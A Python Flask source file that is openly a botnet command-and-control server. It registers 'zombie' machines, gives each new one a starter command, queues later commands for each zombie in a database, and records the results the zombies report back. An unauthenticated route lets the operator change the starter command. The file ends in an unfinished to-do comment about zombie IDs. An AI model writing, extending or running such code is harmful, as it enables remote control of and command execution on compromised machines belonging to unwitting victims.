from flask import Flask
from database_helper import OpenDatabase

app = Flask(__name__)

# some constants
newcomer_command = "dir" # a dir command for windows cmd
database_name = 'test_database.db'


@app.route("/databaseSetup")
def setUpDatabase():
    global database_name
    try:
        # create the database file in the working directory (i assume it's next to this file)
        with open(database_name, 'x'):
            pass
    except:
        # if we're here, the database file already exists. so just pass
        pass
    # create the required tables in the database
    with OpenDatabase(database_name) as helper:
        helper.setUpDatabase()
    return ''
    

@app.route("/getId")
def give_id():
    print('server - give_id')
    """give an id for a newcomer zombie"""
    global database_name
    with OpenDatabase(database_name) as helper:
        last_id = helper.getLastId()
    return str(last_id+1)

@app.route("/reportResult/<zid>/<command>/<result>")
def recordExecutionResult(zid, command, result):
    print('server - record_response')
    """this is how i receive responses (from zombies) to previously sent commands."""
    global database_name
    with OpenDatabase(database_name) as helper:
        res = helper.writeResult(zid, command, result)
    return result


@app.route("/setNewcomerCommand/<the_command>")
def set_newcomer_command(the_command):
    """this method is reserved for me. it's how i change the newcomer_command."""
    global newcomer_command
    newcomer_command = the_command
    return f"Now the newcomer_command is {newcomer_command}"


@app.route("/getCommand/<zid>")
def send_command(zid):
    print('server - send_command')
    """this method will be hit by a zombie repeatedly within some time interval."""
    global database_name
    global newcomer_command
    # fetch the next command for the zombie with that zid
    with OpenDatabase(database_name) as helper:
        idExists = helper.idExists(zid)
    # check if the zombie is known or not.
    if not idExists: # new zombie. give it the newcommer command
        print('server - send_command - new_zombie')
        # add the zombie (and a die command) to the zombies table and create another table just for the zombie.
        with OpenDatabase(database_name) as helper:
            helper.registerZombie(zid)
        print("a new zombie joined with zid : {}".format(zid))
        # this is the first time we're seeing a zombie, so .... 
        # we give the zombie the newcomer_command but set the waiting command in the database to be 'die'
        # so that when it fetches the 2nd command from the server, it gets 'die'
        # remember: the very first time command (newcomer_command) is not from the database. the 2nd, 3rd time ... commands are from the database.
        return newcomer_command
    else:
        print('server - send_command registered_zombie')
        # the zombie is known so get the command I've put for it.
        with OpenDatabase(database_name) as helper:
            waitingCommand = helper.readWaitingCommand(zid)
        return waitingCommand


# to do: I discovvered the uuid is different everytime the script starts. fix this it should be constatnt on the same 